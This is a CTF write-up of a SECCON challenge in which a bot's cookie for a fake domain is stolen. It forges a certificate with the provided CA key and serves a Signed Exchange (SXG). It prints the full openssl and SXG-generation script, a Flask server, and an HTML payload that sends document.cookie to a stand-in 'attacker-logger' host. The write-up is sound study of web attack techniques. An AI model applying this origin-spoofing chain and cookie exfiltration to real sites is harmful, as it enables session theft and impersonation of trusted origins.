
# Intro

This challenge was new enough to me to don't solve that during competition or neighter after that, well actually the main idea to solve this was really uknown to me

# Challenge stuff
It was an XSS challenge, but there were no web application that had any XSS vuln though (only the bot that visits the given url)

Here's some of the important part to keep in mind

Directory structure

```
..
├── bot
│   ├── cert.crt
│   ├── cert.key
│   ├── conf.js
│   ├── Dockerfile
│   ├── index.js
│   └── views
└── compose.yaml

```

conf.js
```js
export const visit = async (url) => {
  console.log(`start: ${url}`);

  const browser = await puppeteer.launch({
    headless: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--js-flags=--noexpose_wasm,--jitless",
      "--disable-features=HttpsFirstBalancedModeAutoEnable",
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    await context.setCookie({
      name: "FLAG",
      value: flag.value,
      domain: "hack.the.planet.seccon",
      path: "/",
    });

    const page = await context.newPage();
    await page.goto(url, { timeout: 3_000 });
    await sleep(5_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```


But we were provided with The *CA* certificates (cert.key and cert.crt) credentials that was trusted for the bot (the dockercontainer).

The docker container trusted this certificate using the following command in Dockerfile

```Dockerfile
RUN mkdir -p /home/pptruser/.pki/nssdb \
    && certutil -A -d "sql:/home/pptruser/.pki/nssdb" -n "seccon" -t "CT,c,c" -i ./cert.crt
```

And the private key was given to us in the `/hint` endpoint. so that means any website that is behind TLS, that it's certificte were signed by the **seccon** certificate authority, will be accepted and trusted in the docker container browser

so we had:

1. A cookie with a Non-existent domain ('hack.the.planet.seccon')
2. A docker container that trusted the provided CA
3. And finally the CA certificate and it's private key as well

### Note
As you can see the cookie's domain was set to something that didn't even exsits => `hack.the.planet.seccon`

> Note: cookies "Domain" properties in browsers will isolate that cookie into specific domain and origin, [ref](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent)

so the only way to steal that cookie is to somehow trigger browser to ensure that we are in **hack.the.planet.seccon** origin, but keep in mind that is not possible here to register that domain then serve our malicious script to steal that cookie

But we were given the trusted certificates credentials, so what is its purpose?


# Signed Exchange (SXG)

`An SXG is a delivery mechanism that makes it possible to authenticate the origin of a resource independently of how it was delivered.` by **[web.dev](https://web.dev/articles/signed-exchanges#:~:text=An%20SXG%20is%20a%20delivery%20mechanism%20that%20makes%20it%20possible%20to%20authenticate%20the%20origin%20of%20a%20resource%20independently%20of%20how%20it%20was%20delivered.)**

in simple explain, you can sign your HTTP request/response via the origin of the resource certificates private key in a way that the browser will accept that, the origin of that request/response is related the another origin

for example, a response may came from `example.com` but signed with the `origin.org` private key that it's CA is trustd in the browsers, so the browser can be sure that the origin of the resource that comming from `example.com` is `origin.com`. well, I guess i explained it very bad :). so check out the `https://web.dev/articles/signed-exchanges` for more information


# Solution

here's the step

```sh
#!/bin/bash

# 1. generate a new private key
openssl ecparam -name prime256v1 -genkey -out leaf.key

# 2. make a new certificate signing request + proper CN
openssl req -new -sha256 \
  -key leaf.key \
  -out leaf.csr \
  -subj "/CN=hack.the.planet.seccon"

# 3. sign that CSR via the provided CA.KEY/CA.CRT + SAN
openssl x509 -req -days 90 \
  -in leaf.csr \
  -CA ca.crt \
  -CAkey ca.key \
  -CAcreateserial \
  -out leaf.pem \
  -extfile <(cat <<EOF
1.3.6.1.4.1.11129.2.1.22 = ASN1:NULL
subjectAltName = DNS:hack.the.planet.seccon
EOF
)


SERIAL=$(openssl x509 -in leaf.pem -serial -noout | cut -d= -f2)
echo -e "V\t301231235959Z\t\t${SERIAL}\tunknown\t/CN=hack.the.planet.seccon" > index.txt

openssl ocsp \
  -index index.txt \
  -rsigner ca.crt \
  -rkey ca.key \
  -CA ca.crt \
  -issuer ca.crt \
  -serial 0x${SERIAL} \
  -respout cert.ocsp \
  -ndays 7

~/go/bin/gen-certurl -pem leaf.pem -ocsp cert.ocsp > cert.cbor


# generate a signed exchange content form our index.html
~/go/bin/gen-signedexchange \
  -uri https://hack.the.planet.seccon/index.html \
  -content index.html \
  -certificate leaf.pem \
  -privateKey leaf.key \
  -certUrl https://redacted.domain/cert.cbor \
  -validityUrl https://hack.the.planet.seccon/validity \
  -expire 168h \
  -o index.html.sxg

```


as you can see you need to server those file on the `https://redacted.domain` and that should be https though,

server.py

```python
from flask import Flask, send_file, make_response

app = Flask(__name__)

@app.route("/index.html.sxg")
def serve_sxg():
    resp = make_response(send_file(
        "index.html.sxg",
        mimetype="application/signed-exchange;v=b3"
    ))
    resp.headers["X-Content-Type-Options"] = "nosniff"
    return resp

@app.route("/cert.cbor")
def serve_cert():
    resp = make_response(send_file(
        "cert.cbor",
        mimetype="application/cert-chain+cbor"
    ))
    resp.headers["X-Content-Type-Options"] = "nosniff"
    return resp

@app.route("/validity")
def validity():
    # Minimal validity URL: just needs to return 200
    return "ok", 200, {
        "Content-Type": "text/plain",
        "Cache-Control": "max-age=60"
    }

@app.route("/index.html")
def normal_html():
    return send_file("index.html")


if __name__ == "__main__":
    # Bind to all interfaces so it works via IP
    app.run(host="carrot.me", port=443, debug=True, ssl_context=("python-server.crt", "python-server.key"))
    # notice that the certificates is signed by the trusted CA (seccon)
    # so just make a new private key and a csr with CN/SAN = redacted.domain and sign that with the provided CA that is trust by browser already 
```

> NOTE: if the browser don't trust the CA that is provided and the browser show you a warning, if you accept that warning and proceed to site btw, it won't work and after you go the `https://redacted.domain/index.html.sxg` it will redirect you to the `https://hack.the.planet.seccon` and so it's just a simple redirection (no xss tho)


index.html

```html
<html>
<script>
	location = "https://attacker-logger.domain?"+document.cookie
</script>
</html>
```


# Resources

- https://web.dev/signed-exchanges/
- Sharer's World - HITCON CTF 2023 -> https://gist.github.com/betrisey/d5645e5463c95ea7f1e28dcfa8d5bd02
- https://i.blackhat.com/BH-USA-25/Presentations/USA-25-Chen-Cross-Origin-Web-Attacks-via-HTTP2-Server-Push-and-Signed-HTTP-Exchange-Thursday.pdf
- https://www.ndss-symposium.org/wp-content/uploads/2025-1086-paper.pdf